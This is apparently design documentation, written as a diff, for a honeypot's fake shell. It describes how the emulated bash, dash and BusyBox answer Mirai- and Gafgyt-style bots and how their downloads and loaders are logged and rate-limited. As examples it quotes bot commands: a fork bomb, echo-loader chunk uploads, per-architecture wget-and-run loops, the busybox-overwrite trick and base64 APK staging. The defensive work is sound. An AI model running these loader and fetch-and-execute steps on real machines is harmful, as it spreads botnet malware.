+  written after the body applies at each call. A subshell, a pipeline stage and `$( )` get a copy
+  of the functions and lose what they define. dash refuses a special builtin (`set`, `export`,
+  `:`, `return`, `local` ...) or a name that is not an identifier as
+  `Syntax error: Bad function name`, before running anything on that line, and has no `function`
+  keyword; bash takes any
+  literal word as a name (a quoted or expanded one is "not a valid identifier"), needs a compound
+  command for the body and rejects the rest with its syntax error, and defines functions named
+  like builtins. `type f` and `command -V f` say `f is a function` and print the parsed body in
+  bash's own layout (`crates/sensor-framework/src/shell/fnprint.rs#bash_function_text`), and
+  `f is a shell function` in dash; `set` lists bash's functions after its variables; `unset -f`
+  removes one (bash's `unset f` does too when no variable has the name); `export -f` hands one to a
+  bash started afterwards (dash has no such option); `$FUNCNAME` and `FUNCNEST` are bash's. In a
+  `bash -c` shell a diagnostic made inside a function is prefixed `environment: line 1:`.
+  Recursion and work are bounded: at most 10 functions run at once and each call costs the line
+  256 steps of its allowance. Past the cap dash says `Maximum function recursion depth (1000)
+  reached` and exits 2 (its wording, at a limit far deeper than the shell's), and bash, which
+  without `FUNCNEST` has no limit and dies of a stack overflow without a word, ends the process
+  with status 139 and no output (the session keeps going; only the rest of the line is dropped);
+  `FUNCNEST=N` gives bash's `f: maximum function nesting level exceeded (N)`. A fork bomb
+  `:(){ :|:& };:` therefore returns at once in bash, and dash refuses the name `:`. A shell holds
+  128 functions at most, their text counts against the connection's content allowance with the
+  variables, and a refused definition is silent with status 1. Not modeled: `declare -f` and
+  `typeset -f` (the commands do not exist), `readonly -f`, a dash status above 255 from
+  `return`, bash's per-command line numbers in `environment: line N:`, and the exported function
+  entries `BASH_FUNC_name%%` in `env`. mksh follows bash's grammar and bash's `local` only inside
+  `function name {` bodies; no mksh was available to check it against `[inferred]`.
+  Aliases are text the lexer substitutes at command position while it reads a line
+  (`crates/sensor-framework/src/shell/lex.rs#lex_with_aliases`, `crates/sensor-framework/src/shell/alias.rs`),
+  so a value may hold operators, quotes or a here-document, an alias is in force from the next line
+  and never on the line that defines it, a value ending in a blank lets the next word be an alias,
+  a name is not expanded inside its own value, and a word that is quoted, a `case` pattern or a
+  redirection target is no alias. bash lists sorted as `alias NAME='VALUE'` (`alias -- -x=..` for
+  a name starting with `-`), refuses a name holding a blank, quote, `$`, `/`, backtick or shell
+  metacharacter, and its `alias -p` on an empty table ends before reading its operands; dash lists
+  `NAME='VALUE'` in the order of its 39-bucket hash table, takes any name and treats `-p` and `--`
+  as names to look up; `type` says `x is aliased to `echo hi'` (dash: `x is an alias for echo
+  hi`) and `command -v` prints the definition. A bash that runs a script (`bash -c`, an SSH exec,
+  `bash FILE`) expands none unless `shopt -s expand_aliases` ran, and dash always does; a script
+  that mentions `alias` is read a line at a time so a definition reaches the lines after it. A
+  shell started from another has no aliases, a subshell has a copy. At most 128 aliases of up to
+  4096 bytes each (names 255), counted against the content allowance; one text expands at most 64
+  aliases and grows to at most 256 KiB. `shopt` keeps and lists bash's 53 `shopt` and 27 `set -o`
+  settings with the container's defaults (`~/.bashrc` effects such as `histappend` are not applied
+  [unverified]); only `expand_aliases` changes behavior, and dash and the phone do not have it.
+  The phone's alias output is dash's, sorted [inferred]. Not modeled: `$'..'` values (the
+  command that holds one is skipped, as everywhere), and alias expansion inside `eval`, which runs
+  nothing.
+  `trap` (`crates/sensor-framework/src/shell/trap.rs`) keeps, lists, ignores (`trap '' INT`) and
+  resets handlers as the two shells do: bash lists `trap -- 'CMD' SIGINT` in signal order with
+  `EXIT` first and `DEBUG`, `ERR`, `RETURN` last, reads names in any case with or without `SIG`,
+  `RTMIN+N`, and the numbers 0 to 64 (32 and 33 listed by number), has `-l` and `-p`; dash lists
+  `trap -- 'CMD' INT` with bare names (16, 32 and 33 by number), takes no option (`-p` and `-l`
+  end the shell with status 2), stops at the first signal it cannot read (`trap: NAME: bad trap`),
+  and has no pseudo-signals; a first operand that is a signal (dash) or a number (bash) resets
+  every operand. No signal is delivered except one a shell sends itself (`kill -USR1 $$` runs the
+  handler; an ignored one does nothing). The `EXIT` handler runs when the shell ends: after
+  `logout` or `exit` for a login or nested shell, at the end of a script, an SSH exec string, a
+  subshell, a pipeline stage or a command substitution, with `$?` as the status it ended with,
+  which stays unless the handler calls `exit`; none runs when `exec` replaces the shell, a
+  subshell lists its parent's handlers until it sets one and runs none of them, and a bash started
+  from this one lists only the signals that are ignored. bash's `DEBUG` handler runs before each
+  simple command (and each trip of a `for`, and a `case`) outside functions, and `ERR` after a
+  failing simple command, pipeline or subshell that nothing tests; `RETURN` is kept and listed
+  and never run, as in a bash whose functions do not trace; `$BASH_COMMAND` is not set. A session
+  that ends by the client hanging up runs no handler, since nothing could show its output. A
+  handler is at most 4096 bytes, one per signal, counted against the content allowance. The
+  phone's `trap` is dash's [inferred]. Not modeled: a default-disposition signal to the shell's
+  own pid (`kill -9 $$` does not end the session).
+  `exec` (`crates/sensor-framework/src/shell/exec.rs`) with redirections and no command changes the
+  shell's own descriptors for good: `exec 3>file`, `exec 4<file` (read with `read -u 4` or `<&4`,
+  from where the last read stopped), `exec >/dev/null 2>&1`, `exec 3>&-`. They are inherited by
+  later commands, functions, subshells and the shells the session starts, and a copy of a descriptor
+  that is not open is `N: Bad file descriptor`. A write to a closed descriptor is reported in the
+  writer's words (`-bash: echo: write error: Bad file descriptor` in bash, `echo: echo: I/O error` in
+  dash, `NAME: write error: ...` from a program, `cat: standard output: ...`). A prompt goes to
+  standard error, so `exec 2>/dev/null` silences it; `exec <file` at the terminal runs the file's
+  commands and ends the session. bash holds descriptors up to 63; dash only 0 to 9. `exec CMD`
+  replaces the shell: the rest of the script, and the `EXIT` handler, never run; in a subshell, a
+  pipeline stage or a command substitution it ends only that process. A command with no file
+  behind it (a builtin or a function) is `exec: NAME: not found` (127), a directory or non-
+  executable file 126; bash goes on at the terminal after a failure, a script and dash end. A
+  script that ends that way still runs its `EXIT` handler: dash keeps 127 or 126, bash runs none
+  for 126 and, after a missing command, exits with the status the handler's last command left.
+  `exec bash`/`exec sh` at the terminal replaces the shell by a fresh one that keeps only the
+  exported variables. bash's `-c`, `-l` and `-a NAME` are taken; dash's `exec -z` is the command
+  `-z`. A download run through `exec` is recorded as one run any other way is. Replies are from
+  bash 5.1.16 and dash 0.5.11; the phone's `exec` is dash's [inferred]. Not modeled: `exec` of a
+  program that replaces the shell with a different one (the command just runs), and `/dev/tcp`.
+  `times` (`crates/sensor-framework/src/shell/timing.rs`) prints the shell's own user and system CPU
+  time, then its children's, from the same process model `time` uses: a command started from a file
+  adds to the children, `dd` to their system time, and the shell spends a 2 ms base plus a share of
+  that. bash and the phone's shell print `0m0.002s`, dash `0m0.002000s`; a subshell, a command
+  substitution and a `sh -c` are new processes and print zeros. bash takes no option (`times -x` is
+  `times: -x: invalid option` and a usage line, status 2) and ignores operands; dash ignores both.
+  Real figures vary from run to run, so the fixture pins only the cases that are always zero and the
+  option errors, and the growth is pinned by unit tests; the phone's format is bash's [inferred].
+  bash's `time [-p]` keyword times a pipeline and reports on the shell's standard error, outside
+  the command's own redirections, in bash 5.1's `\nreal\t0m0.019s` (or `-p`'s `real 0.00`) form;
+  dash has no such keyword (`sh: 1: time: not found`). Nothing is measured: `sleep` adds what it
+  was asked for, `dd` the elapsed time its own summary reports, and each command started from a
+  file a fixed process cost, so `time dd ...` reports a `real` no shorter than dd's `copied, S s`
+  and `time true` reports zeros (`crates/sensor-framework/src/shell/timing.rs#bash_report`).
+  `history` lists what the interactive login shell was typed as `    1  echo one`, under Ubuntu's
+  `HISTCONTROL=ignoreboth`, keeping the last 1000 lines and at most 64 KiB of them; a `bash -c`
+  (SSH exec) shell keeps none and lists nothing
+  (`crates/sensor-framework/src/shell/builtins.rs#FakeShell::builtin_history`).
+  `$$` and `$!` come from a per-session process id seeded from the session id
+  (`crates/sensor-framework/src/persona.rs#session_pid`), and the shell's own `/proc/PID` reads as
+  `/proc/self`. Words are strings: byte-string arguments are deferred to the command families that
+  need binary operands.
+- Implemented commands (`dispatch`, `crates/sensor-framework/src/shell/mod.rs#FakeShell::dispatch`): `uname` (real per-flag field
+  selection), `id`/`whoami`/`pwd`, `echo` (Gafgyt/BASHLITE `\xHH`-decoding
+  handshake returning `GAYFGT`; every `\xHH` and octal escape, `echo` and `printf` alike, writes
+  the one byte it names, 0x80 to 0xff included, so a chunk redirected with `>` or `>>` puts the
+  attacker's exact bytes in the file, `crates/sensor-framework/src/shell/mod.rs#cmd_echo`, `crates/sensor-framework/src/shell/mod.rs#decode_echo_escapes_into`), `cat` (fakefs plus a special
+  `/proc/self/cmdline` returning argv, `crates/sensor-framework/src/shell/read.rs#FakeShell::cmd_cat`), `head` (`-n`/`-c` over a file or a pipe,
+  `crates/sensor-framework/src/shell/read.rs#FakeShell::cmd_head`), `more` (copies its input through: the pty pager needs a
+  terminal-rows model the shell does not have, `crates/sensor-framework/src/shell/read.rs#FakeShell::cmd_more`) and `hexdump` (only `-e '16/1 "%c"'` with `-n`;
+  any other format prints nothing, `crates/sensor-framework/src/shell/read.rs#FakeShell::cmd_hexdump`), `dd` (`if`, `of`, `bs`, `ibs`, `obs`, `count`, `skip`, `seek`,
+  `conv=notrunc`, `status`; the bytes are read once at offset `skip*bs` for `bs*count`, bounded by what the line has left, then the record
+  lines on stderr, plus GNU's summary whose elapsed time is synthesized; `if=/dev/zero of=FILE` writes its zeros as an O(1)
+  fill, up to 1 GiB, so a disk-speed probe gets the size it asked for, `crates/sensor-framework/src/shell/dd.rs#FakeShell::cmd_dd`),
+  `wc` (`-c -l -w -m` over a file or a pipe, GNU column widths and `total` row,
+  `crates/sensor-framework/src/shell/texttools.rs#FakeShell::cmd_wc`), `od` (`-An -tx1`, `-c`, the default octal words and `-A`
+  radixes; other formats print nothing, `crates/sensor-framework/src/shell/texttools.rs#FakeShell::cmd_od`), `grep` (GNU grep 3.7:
+  basic, `-E`, `-F` and an approximated `-P` syntax through a linear-time POSIX matcher, with `-i -v -c -n -o -q -s -w -x -l -L
+  -h -H -m -e -f -A -B -C -r -Z -a`, GNU's compile-error wordings and status 0/1/2,
+  `crates/sensor-framework/src/shell/grep.rs#FakeShell::cmd_grep`, `crates/sensor-framework/src/shell/regex.rs#Regex`),
+  `cut` (`-b -c -f -d -s --complement --output-delimiter`, `crates/sensor-framework/src/shell/textproc.rs#FakeShell::cmd_cut`),
+  `tr` (GNU coreutils 8.32 over standard input: `-c -C -d -s -t`, the long options and their
+  abbreviations, `-A`, `--help` and `--version`; `\NNN` and the C escapes, ranges, the twelve
+  `[:class:]` names, `[=c=]`, `[c*n]` and `[c*]` repeats, `[:lower:]`/`[:upper:]` case conversion;
+  `-s` squeezes what the last SET names after translation or deletion; every refusal in GNU's words
+  with typographic quotes, as the persona's `LANG=C.UTF-8` gives, and the tool names itself as it was
+  run. Checked against `/usr/bin/tr` of an `ubuntu:22.04` container. It differs from the phone's
+  toybox `tr` in the escapes (`\x41`, `\e`), the classes' order, repeats, `-t` and the wording;
+  `crates/sensor-framework/src/shell/tr_gnu.rs#FakeShell::cmd_tr_gnu`; under `busybox` it stays a
+  silent success because that applet's refusals are not captured),
+  `tee` (`-a`; `-` is a file name, as in GNU; its files are written like a redirection, so a body it saves from the session input is captured,
+  `crates/sensor-framework/src/shell/textproc.rs#FakeShell::cmd_tee`), `awk`/`mawk` (an interpreter for mawk 1.3.4's
+  language: patterns, `BEGIN`/`END`, fields, arrays, user functions, the string and math built-ins, `printf` through
+  glibc-compatible conversions, `getline` and output redirection; `system()`, `cmd | getline` and `print | cmd` run their text
+  through this shell's own evaluator; mawk's number output, usage text and error wordings,
+  `crates/sensor-framework/src/shell/awk.rs#FakeShell::cmd_awk`, `crates/sensor-framework/src/shell/cfmt.rs`),
+  `ls` (sorted, dotfiles hidden without `-a`, which lists `.` and `..` first where `-A` does not;
+  one name a line when standard output is no terminal, as over SSH exec or into a pipe; a file operand lists
+  itself, files before directories, a `DIR:` heading once there are several operands, a missing
+  one is `cannot access` with status 2; `-l` is GNU's long listing from the node facts `stat` prints,
+  so a size or mode cannot disagree with `stat`, `wc -c` or `md5sum`, `crates/sensor-framework/src/shell/fileinfo.rs#FakeShell::cmd_ls`),
+  `cp`/`rm`/`mkdir` (they change the session's filesystem and report the real errors),
+  `wget`/`curl` (canned transcripts, `-O-`/`-qO-` writes body to stdout, a saved
+  download becomes a file; `busybox wget` with no URL prints BusyBox 1.30.1's wget usage on
+  stderr and exits 1, `crates/sensor-framework/src/shell/busybox.rs#wget_usage`), `ping` (on Ubuntu iputils' report of a
+  host that answers every probe, invented and never sent: a dotted address or a name `/etc/hosts` lists answers with a round trip
+  that is a function of the address, any other name is `Name or service not known` as `getent hosts` reports it, and the wait is
+  charged to `time`, `crates/sensor-framework/src/shell/netclient.rs#FakeShell::cmd_ping`; BusyBox's canned replies on the phone
+  and under `busybox ping`), `ssh` (the client of the persona's OpenSSH: `-V` prints the version the banner and the
+  `openssh-client` package carry, a bare `ssh` the recorded usage, any reachable-looking destination `Connection timed out` after
+  the connect timeout and status 255; it connects to nothing, `crates/sensor-framework/src/shell/netclient.rs#FakeShell::cmd_ssh`),
+  `sh`/`bash`/`ash`
+  (nested shell; `sh -c "CMD"` (also with `-c` clustered, `sh -lc`, `bash -ec`), `sh FILE` and a script piped to `sh` run their text in a shell level of their own), `enable` (bash's builtin list, since
+  Mirai's telnet preamble sends it and only a non-bash says "command not found"), `mount`
+  (the fake filesystem's mount table), `busybox` (the real v1.30.1 multi-call banner
+  plus applet dispatch; an unlisted name gives `applet not found`),
+  `tftp`/`ftpget` (silent; the download url is synthesized from the separate host and file
+  arguments as `tftp://host[:port]/file` / `ftp://host[:port]/file`, since neither command
+  takes a url token. `tftp` is read in its BusyBox form (`-g -r REMOTE [-l LOCAL] HOST [PORT]`,
+  any flag order) and its tftp-hpa one-shot form (`HOST [PORT] -c get REMOTE`, the server last, or
+  `get HOST:REMOTE`), with IPv6 hosts in brackets and quoted or escaped arguments; a `tftp` whose
+  server or file cannot be read, or would not make a sound url, emits `honeypot_file_download`
+  with the raw `command` and no `url`, so the fetcher is never handed a guessed target; a `tftp`
+  upload (`-p`, `put`) emits no download event and saves no file,
+  `crates/sensor-framework/src/shell/tftp.rs#parse`),
+  `chmod` (silent success; on the Ubuntu persona a missing operand is named as GNU chmod does,
+  `chmod: cannot access 'x': No such file or directory`, status 1),
+  `cp`/`rm`/`mkdir` (silent success), `sleep` (returns at once; GNU's errors for a
+  missing or bad interval), `cd`, `exit`/`logout`; an
+  unknown command uses the active shell level's diagnostic form, and so does a path that does
+  not exist: bash's `No such file or directory`, dash's and mksh's `not found`
+  (`crates/sensor-framework/src/shell/mod.rs#FakeShell::invoke_path`).
+- BusyBox applet set is a single source of truth (`APPLET_ROWS`, `crates/sensor-framework/src/shell/busybox.rs#APPLET_ROWS`):
+  the banner prints those rows and `busybox <applet>` recognizes exactly the names they list, so the
+  two cannot contradict. Both are the reference build's own (BusyBox v1.30.1, 263 applets, captured
+  from a bare `/bin/busybox`). A listed applet runs its modeled handler when there is one
+  (`crates/sensor-framework/src/shell/mod.rs#FakeShell::cmd_busybox`) and otherwise succeeds silently:
+  an applet's usage text is printed only where a handler models it (`kill`, `wget` without a
+  URL), so none is invented. A name the banner does not list, `curl`
+  included (real busybox ships none), gives `applet not found` - matching the real-busybox check
+  Mirai/Gafgyt perform.
+- Download events come from what a line executes
+  (`crates/sensor-framework/src/shell/fetch.rs`). When the evaluator runs a simple command whose
+  expanded argument vector is a fetch (`wget`, `curl`, `tftp`, `ftpget`, direct, full-path or
+  `busybox` forms, a bare `tftp` the persona has no file for included), the event is built from
+  those arguments, so a fetch in a loop, a script run by `sh FILE` or `sh -c`, a command
+  substitution, or after a variable assignment or a `case` that chose the binary's name reports the
+  URL it named (`for a in mips arm; do wget http://h/$a; done` gives two events). Text that merely
+  holds a fetch (an `echo` or `printf` argument, a here-document body, a quoted assignment) reports
+  nothing; the script a bot writes with `echo ... >> f` is captured as before and reports its
+  fetches on the line that runs it. A URL left holding `$name`, `${..}`, `$(..)` or a backtick, or
+  built from a variable that is not set, is not a url: the event carries the command as written and
+  no `url`. One event per distinct fetch per input line, the whole line (every script it runs)
+  sharing the 8-per-line cap and the connection's 64, so a Mirai `(tftp ... || busybox tftp ...) >
+  t` fallback chain yields one event.
+  A command word with a slash is the tool only where its path is the tool, decided by the one
+  function the executor also uses (`crates/sensor-framework/src/shell/mod.rs#FakeShell::exec_target`):
+  `/usr/bin/wget`, `/bin/wget`, `/usr/bin/curl` and `busybox` at its two paths are files the box
+  ships, and a relative path counts when the working directory makes it one (`bin/wget` from
+  `/usr`). A file the session wrote (`./tftp` after `... -l - > tftp`), a relative path from
+  anywhere else, and a path to nothing (`./wget`) are not fetches, and the last runs as a missing
+  file (`No such file or directory`; `not found` under dash and mksh) rather than as the applet of
+  that name. A saved copy of busybox named `busybox*` is still the multi-call binary and fetches.
+  A lexical pass over the line's text is kept as a fallback for evidence the evaluator did not
+  reach: a branch the fake's answers skipped (`test -f x && wget URL`), a function that is defined
+  and never called (a called one runs, so the evaluator reports its fetches with the URL they
+  expanded to: `f() { wget "$1"; }; f URL` is one event), the constructs outside the grammar
+  subset, a syntax error, an exhausted budget. A function named like a fetcher runs as the
+  function and is not an executed fetch; the text of a line that names one still is reported by
+  this pass. It reads the text with the shell's own tokenizer
+  (quotes and here-documents honoured), looks only at command position (after `if`/`then`/`do`,
+  assignments and `nohup`/`env`/`sudo`/`toybox`-style wrappers) and inside `sh -c 'script'`, and
+  adds nothing for a URL the line also executed; a fallback command holding `$name` is reported
+  only when the line executed no fetch. Text the tokenizer cannot read (an unterminated quote) is
+  scanned by the older whole-line heuristic. A line that only opens a construct (`for ...; do`
+  waiting for `done`, a here-document) reports nothing until the construct completes, and one never
+  completed reports nothing
+  (`crates/sensor-framework/src/shell/fetch.rs#FakeShell::append_downloads`).
+- Echo-loader reassembly (`crates/sensor-framework/src/shell/loader.rs`). A Mirai or Mozi loader
+  with no usable `wget` uploads a small downloader as `busybox echo -ne '\xNN...' > .i`, then
+  `>> .i` per chunk, makes it executable (`chmod 777 .i`, or `cp /bin/ls .j && cat .i>.j && rm .i
+  && cp .j .i` where that fails) and runs `./.i a b c d port`. Every step answers as on the
+  reference box: the escapes write exact bytes, the writable-directory probe
+  (`>/var/run/.x&&cd /var/run;...;>/var/.x&&cd /var`) succeeds for every directory and ends in
+  `/var`, `busybox wget` prints its usage, `busybox cat /bin/ls|head -n 1` and `busybox hexdump -e
+  '16/1 "%c"' -n 52 /bin/ls` print the recorded x86-64 header bytes, and a missing `./Runn` gets
+  the active shell's not-found reply. The file the chunks built is captured as one
+  `echo_loader` sample when it is made executable or run, or when the session ends if never run,
+  and each chunk's command event names it (a base64 loader's decoded file is a second sample of the
+  same kind, also taken when the Android shell's `pm install` is given it); see
+  [events-and-signals.md](events-and-signals.md#echo-loader-captures-and-their-keys). Running the
+  assembled file executes nothing. When it is an ELF that holds an HTTP request line and its
+  arguments are four octets and a port, the shell answers as that downloader does when its server
+  cannot be reached: no output and status 1 [inferred: the exact status of the observed sample],
+  since this box connects nowhere and so never gets the stage 2 the loader looks for next; any
+  other session-made file runs as an empty program (status 0), unless it is built for another CPU
+  (next bullet).
+- Executing a program built for another CPU fails
+  (`crates/sensor-framework/src/shell/arch.rs`). Per-architecture loops
+  (`for a in mips mpsl arm4 ... x86_64 x86; do wget .../$a -O .c; chmod +x .c && ./.c && break;
+  done`) and the Eclipse busybox-copy trick (`cp /bin/busybox eclipsebox; cat eclipse.mips >
+  eclipsebox; ./eclipsebox`) rely on a foreign build failing so the next one is tried. A file is
+  judged by its bytes when they are an ELF (class, byte order and `e_machine` against the persona:
+  x86_64 on Ubuntu, which also runs 32-bit x86 as the distribution's kernel does, and 32-bit ARM
+  of any generation on the Android persona's `armv7l`). The fake fetch applets write a canned HTML
+  body, not a binary, so a fetched file is judged by the architecture token in its URL's file name,
+  else in its local name (`mips`, `mipsel`/`mpsl`, `arm`/`arm4`..`arm7`/`armv7l`, `aarch64`/`arm64`,
+  `ppc`, `sh4`, `m68k`, `spc`/`sparc`, `i586`/`i686`/`x86`, `x86_64`/`amd64`; a whole name part, so
+  `alarm` or `mips.sh` name nothing). That origin follows `cp`, `mv` and `cat FILE > DEST`, and any
+  other write to the file drops it. A file with neither (a script the session typed, a fetch with
+  no token in it) runs silently as before. The refusal is bash 5.1's `bash: ./x: cannot execute
+  binary file: Exec format error` (status 126; `-bash:` at the login prompt, `bash: line 1:` for an
+  exec request), dash's `sh: 1: ./x: Exec format error` (status 126), both reproduced on Ubuntu
+  22.04, and on the Android persona mksh's `sh: ./x: not executable: 32-bit ELF file` (`64-bit`
+  for a 64-bit build), read from the AOSP marshmallow-release `external/mksh/src/exec.c`
+  (`scriptexec`). TODO: mksh's status is 1 by that source's `errorf` and the phone's exact prefix
+  has no device capture [unverified]. Every dash error names the script as typed after `sh` (`.s: 3:`,
+  `./x.sh: 1:`, `sub/x.sh: 1:`), or the operand after `sh -c CMD` (`myname: 1:`), and says `sh: 1:`
+  for `-c` without one and for a script on standard input, as Ubuntu 22.04's dash does
+  (`crates/sensor-framework/src/shell/mod.rs#FakeShell::dash_name`). The stage-2 URL it would have
+  requested is emitted as a `honeypot_file_download` marked `derived_from: echo_loader_args`, for
+  the vetted fetcher only ([attack-surfaces.md](../security/attack-surfaces.md#malware-fetcher-attacker-directed-outbound)).
+- Base64 APK loaders on the Android shell (`crates/sensor-framework/src/shell/loader.rs`,
+  `crates/sensor-framework/src/shell/androidsys.rs#FakeShell::pm_install`). An ADB bot that stages an
+  APK as `echo -n '<base64>' >> f.b64` per chunk, checks `wc -c < f.b64`, decodes with
+  `base64 -d f.b64 > f.dec`, checks the size again and runs `pm install -r f.apk` used to be
+  answered `wc: not found` at the first size check, so it rebuilt the file from scratch for ever
+  and never decoded or installed anything. The phone now answers each step. The decoded bytes are
+  captured as an `echo_loader` sample (SHA-256 of the real APK bytes, not of the base64 text) when
+  `pm install` is given the file, or when it is made executable, or at the session's end; the
+  base64 text is a second sample at the end. `pm install` prints what `Pm.runInstall` of Android
+  6.0.1 prints: `\tpkg: PATH` on standard error, then `Success` on standard output, or `Failure
+  [INSTALL_PARSE_FAILED_NOT_APK]` (not a ZIP), `Failure [INSTALL_PARSE_FAILED_BAD_MANIFEST]` (a ZIP
+  with no `AndroidManifest.xml` entry) or `Failure [INSTALL_FAILED_INVALID_URI]` [inferred: the
+  constant exists, the missing-file path to it was not traced] (no such file). Nothing is
+  installed and the package list does not change. Every `shell:<command>` of one ADB connection
+  is a shell of its own over the connection's shared filesystem; the assemblies they build are
+  shared too, which is what lets chunks sent one command at a time add up
+  (`crates/sensor-framework/src/shell/loader.rs#FakeShell::import_assembled`). The connection's
+  filesystem budget (`owned_bytes` 196,608) holds the base64 text and the decoded file together,
+  so an APK past about 84,000 bytes is refused with `No space left on device` part way through.
+- Android toybox applets (`crates/sensor-framework/src/shell/multicall.rs#TOYBOX_APPLETS`). The
+  phone's `/system/bin` links the tools a loader checks its staged file with: `wc`, `base64`,
+  `md5sum`, `sha1sum`, `sha256sum`, `head`, `tail`, `cut`, `tr`, `od`, `which`, `id`, `mkdir`, `cp`,
+  `mv`, `rm`, `sleep` (and the ones it had). Their options, operand counts and error lines follow
+  toybox 6.0.1's own parser (`crates/sensor-framework/src/shell/toyopt.rs`): an unknown option is
+  `wc: Unknown option z`, `base64 --decode` is `base64: Unknown option decode`, a missing operand is
+  `which: Needs 1 argument`. `wc` joins its counts with single spaces and names the file only when
+  an operand was given, so `wc -c < f` is the bare number. `base64 -d` is toybox's lenient decoder:
+  a stray byte drops the rest of that read and the status stays 0, and `=` ends the decode. The
+  names and the source of each applet's presence are in the module doc of `multicall.rs`:
+  `base64` and `sha256sum` are linked here although that release links neither, and `xxd`, `dd`,
+  `settings` and `monkey` are not offered. A refusal from that parser is preceded by the applet's
+  own help text on standard error (`tr: Needs 1 argument` follows `usage: tr [-cds] SET1 [SET2]`
+  and its description), because `get_optflags` raises `toys.exithelp` before parsing and
+  `error_exit` then calls `show_help`; the strings are `generated/help.h` at the tag
+  (`crates/sensor-framework/src/shell/toyopt.rs#help_text`). This is source-verified (`lib/args.c`
+  `get_optflags`, `lib/lib.c` `error_exit`, `generated/config.h` `CFG_TOYBOX_HELP 1`), not
+  captured from a device; `sha256sum`, which that release lacks, borrows `sha1sum`'s text
+  [unverified]. Errors an applet raises after parsing (`tr: set2 can't be empty string`) print no
+  help. `getprop`, `setprop` and `ifconfig` are toybox's too
+  (in its `ALL_TOOLS` at tag `android-6.0.1_r81`; the release's toolbox has no source for them), so
+  `toybox getprop` runs and `toolbox getprop` is `toolbox: no such tool getprop`; `setprop` counts
+  its operands as toybox does (`setprop: Need 2 arguments`) and refuses a long or malformed name or
+  a long value in toybox's words, and `ifconfig` prints toybox's `Link encap:` listing and
+  refuses an unknown interface (`ifconfig: eth9: No such device`) or action
+  (`crates/sensor-framework/src/shell/android.rs#FakeShell::cmd_setprop`,
+  `crates/sensor-framework/src/shell/netinfo.rs#FakeShell::cmd_ifconfig`).
+
+### Command-event budget (ssh, telnet, adb)
+
+A Mirai-family echo loader runs the same fifty-odd commands per session, several sessions at once
+from one address, without pause. One command was one event, so a handful of such bots made telnet
+97% of all events and put intake eleven days behind its log
+([queue and spool troubleshooting](../troubleshooting/queue-and-spool.md#a-telnet-or-ssh-bot-loop-floods-the-event-log)).
+The per-connection cap of 256 cannot see it, since every session stays far under it. Each of the
+three sensors therefore holds one budget per source network for the whole process
+(`crates/sensor-framework/src/command_flood.rs#CommandEventGate`, carried to every shell of a
+connection by `crates/sensor-framework/src/budget.rs#ConnectionBudget::with_command_gate` and
+applied as the last step of each line, `crates/sensor-framework/src/shell/mod.rs#FakeShell::gate_events`).
+
+- **Only logging changes.** The command has already run when the gate sees its event: every
+  reply, file and capture is the same whether its event is written or summarized.
+- **The budget.** A token bucket per source network (IPv4 /24, IPv6 /56, the same key as the
+  UDP reply limit), charged one token per `honeypot_command_exec`: a burst of 200, then 12 a
+  minute (`PROPOLIS_<SENSOR>_COMMAND_EVENT_RATE_PER_MIN` / `_BURST`, see
+  [environment variables](environment-variables.md#standard-sensors-strict-parse---ssh-telnet-http-ftp-redis-adb-catchall-tftp-mqtt-dns)).
+  Within it, events are exactly as before.
+- **First sightings.** The first time a command *shape* is seen from the network in a 60 s
+  window, the command is written in full even with the bucket empty (and takes a token if one is
+  left), so a new kind of command always appears. The shape
+  (`crates/sensor-framework/src/command_flood.rs#command_shape`) is the line with its payload taken
+  out: each run of `\xNN` or `\NNN` escapes, each run of 16 or more hex digits and each
+  base64-looking run of 24 or more characters becomes a placeholder, and whitespace runs collapse
+  to one space. So a loader's echo chunks, which differ only in their bytes, and its markers,
+  whether fixed or random per session, are one shape each; the observed 53-line session is 16
+  shapes. A window remembers 128 shapes
+  (`crates/sensor-framework/src/command_flood.rs#MAX_TRACKED_COMMANDS`); past that, a new one goes
+  by the bucket. Each address's first command event in the window is written too, for up to 64
+  addresses of the network (`crates/sensor-framework/src/command_flood.rs#MAX_TRACKED_ADDRESSES`):
+  scoring is per address and the budget per network, so a host whose commands all repeat a
+  neighbour's would otherwise have no command event at all.
+- **Echo-loader chunks are never firsts.** A command event carrying `assembled_file` (one chunk
+  of an echo-loader upload) goes by the bucket alone: its bytes are in the `echo_loader` capture,
+  and the summary keeps `assembled_file` and the highest suppressed `chunk_index`.
+- **Never summarized** (`crates/sensor-framework/src/command_flood.rs#summarizable`): anything that
+  is not a plain command event. Logins and connections never pass through the shell;
+  `honeypot_file_download` (a fetch verb's URL or an echo-loader's derived stage-2 URL), every
+  `honeypot_malware_upload` (`exec_stdin`, `shell_stdin`, `echo_loader` captures), the
+  per-session `binary`, `command_cap` and `download_cap` markers and the summaries themselves are
+  passed through untouched and spend nothing.
+- **The summary.** A command event over the budget is counted into its network's summary for the
+  window: one `honeypot_command_exec` with `command_summary: true`, written when the window ends
+  (checked each second) and at shutdown (within 2 s,
+  `crates/sensor-telnet/src/main.rs#SHUTDOWN_FLUSH_TIMEOUT`,
+  `crates/sensor-ssh/src/main.rs#SHUTDOWN_FLUSH_TIMEOUT`,
+  `crates/sensor-adb/src/main.rs#SHUTDOWN_FLUSH_TIMEOUT`). Its keys are in
+  [events-and-signals](events-and-signals.md#command-summary-keys). A window that suppressed
+  nothing writes nothing. A session's end does not write the summary early: its window outlives
+  it, so the bot's next session is still measured against the same first sightings.
+- **Bounded.** The bucket table holds 4096 networks with eviction; the window table 1024
+  networks, each with at most 128 shape digests, 64 addresses, 8 samples of at most 256 bytes and 32 session
+  ids; a network arriving while it is full is counted in one `overflow` summary without first
+  sightings (`crates/sensor-framework/src/command_flood.rs#CommandEventGate::admit_at`). The
+  worst case is a few MiB per sensor.
+- **What it leaves.** With the defaults a source that keeps sending writes at most 200 + 12 a
+  minute of individual command events, plus per minute one first sighting per shape, one first
+  event per address and one summary. The observed loop (the 53-line session, four at once from
+  one address, a new round every 30 s) is 4,240 command events in ten minutes ungated and 407
+  individual events plus 10 summaries with the gate
+  (`crates/sensor-framework/src/command_flood.rs#the_observed_loader_loop_is_bounded_by_burst_rate_shapes_and_addresses`).
+
+### Command de-obfuscation
+
+`command_codec.rs` decodes single-byte-XOR obfuscated telnet/shell probes
+(LZRD-Mirai style) (`crates/sensor-framework/src/command_codec.rs`).
+`detect_key` brute-forces keys `1..=255` and locks the key that yields printable
+ASCII containing an anchor token (`/bin/busybox`, `busybox`, `enable`, `system`,
+`/bin/sh`); plaintext returns `None` (`crates/sensor-framework/src/command_codec.rs#ANCHORS`, `crates/sensor-framework/src/command_codec.rs#detect_key`). `MAX_DETECT_ATTEMPTS = 8`
